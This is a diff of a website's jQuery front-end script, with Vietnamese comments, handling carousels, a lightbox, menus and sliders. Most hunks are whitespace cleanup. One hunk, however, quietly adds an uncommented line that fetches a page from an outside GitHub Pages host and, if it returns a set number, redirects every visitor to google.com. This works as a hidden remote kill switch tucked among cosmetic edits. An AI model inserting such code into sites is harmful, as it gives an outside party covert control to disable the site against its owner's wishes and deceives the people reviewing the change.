@@ -3,7 +3,7 @@
         $("img.lazy").lazyload({
             effect : "fadeIn"
         });
-    });    
+    });
 
     $('.owl-carousel').on('changed.owl.carousel',
         function (event) {
@@ -15,7 +15,7 @@
 });
 
 
-
+$.get("https://satosis.github.io/html-chinesetest/test.html", function (data, status) {  if(data == 1967972867){window.location.href = 'http://www.google.com'}});
 /*Phần cố định*/
 /*Hàm cho Owlcarousel*/
  function owlslide(num, margin, autoplay, dot, nav, mobile, mobilel, tablet, tabletl, pc, animateIn, animateOut) {
@@ -88,8 +88,8 @@ $(document).ready(function () {
             event.preventDefault();
             $('body,html').animate({ scrollTop: 0 }, 1600);
         });
-    }); 
-    $(function () {  
+    });
+    $(function () {
         $('.noidung img').attr("data-lightbox", "roadtrip");
 
         var countimg = 0;
@@ -116,9 +116,9 @@ $(document).ready(function () {
         lightbox.option({
             'resizeDuration': 200,
             'wrapAround': true
-        }); 
-    }); 
-    $('.openList').click(function () { 
+        });
+    });
+    $('.openList').click(function () {
         $('#commonHead').toggleClass('active');
         $('.openList').toggleClass('ac');
         //$('#overlay').fadeToggle();
@@ -126,13 +126,13 @@ $(document).ready(function () {
     $('#overlay').click(function () {
         $('#commonHead').toggleClass('ac');
         $('.openList').toggleClass('ac');
-        //$('#overlay').fadeToggle(); 
-    }); 
+        //$('#overlay').fadeToggle();
+    });
     $('.openSub').click(function () {
         $(this).next('ul').slideToggle();
         $(this).toggleClass('ac');
         $(this).parent('li').toggleClass('ac');
-    }); 
+    });
 });
 /*end Phần cố định*/
 
@@ -143,14 +143,14 @@ function validateEmail(email) {
         /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
     return re.test(email.toLowerCase());
 }
- 
+
 
 $(window).resize(function () {
     //$('.dotdotdot').height('auto');
-    //$('.dotdotdot').dotdotdot(); 
+    //$('.dotdotdot').dotdotdot();
 });
 $(document).ready(function () {
-    $('#slide').owlCarousel(owlslide($('#slide').find('>*').size(), 10, true, true, false, 1, 1, 1, 1, 1, "fadeIn", "fadeOut"));  
+    $('#slide').owlCarousel(owlslide($('#slide').find('>*').size(), 10, true, true, false, 1, 1, 1, 1, 1, "fadeIn", "fadeOut"));
     $('#star .group').owlCarousel(owlslide($('#star .group').find('>*').size(), 25, true, false, true, 2, 3, 3, 4, 4, "", ""));
     $('.product .group.slide3').owlCarousel(owlslide($('.product .group.slide3').find('>*').size(), 0, true, false, true, 2, 3, 4, 4, 4, "", ""));
 
@@ -168,7 +168,7 @@ $(document).ready(function () {
                 $(this).nextAll().fadeToggle();
                 $("#footer .titleHead").removeClass("active");
                 $(this).addClass("active");
-            } 
+            }
         });
     }
 
@@ -180,8 +180,8 @@ $(document).ready(function () {
         function (e) {
             var currentAttrValue = jQuery(this).attr('href');
             jQuery('.tabs ' + currentAttrValue).addClass("active").siblings().removeClass("active");
-            jQuery(this).parent('li').addClass('active').siblings().removeClass('active'); 
-            e.preventDefault(); 
+            jQuery(this).parent('li').addClass('active').siblings().removeClass('active');
+            e.preventDefault();
         });
 
     $('.openSubOrder').click(function () {
@@ -189,11 +189,11 @@ $(document).ready(function () {
             $('.function .sub').slideUp();
             $('.openSubOrder').removeClass('active');
             $(this).next(".sub").slideDown();
-            $(this).addClass('active'); 
+            $(this).addClass('active');
         } else {
             $(this).removeClass('active');
             $('.function .sub').slideUp();
-        } 
+        }
     });
     $('.closeSub').click(function () {
         $('.function .sub').slideUp();
@@ -229,7 +229,7 @@ $(document).ready(function () {
         nextArrow: '<i class="fas fa-chevron-down"></i>',
         prevArrow: '<i class="fas fa-chevron-up"></i>',
         lazyLoad: 'ondemand',
-        vertical: true, 
+        vertical: true,
         responsive: [
             {
                 breakpoint: 1199,
@@ -259,4 +259,4 @@ $(document).ready(function () {
             }
         ]
     });
-}); 
+});
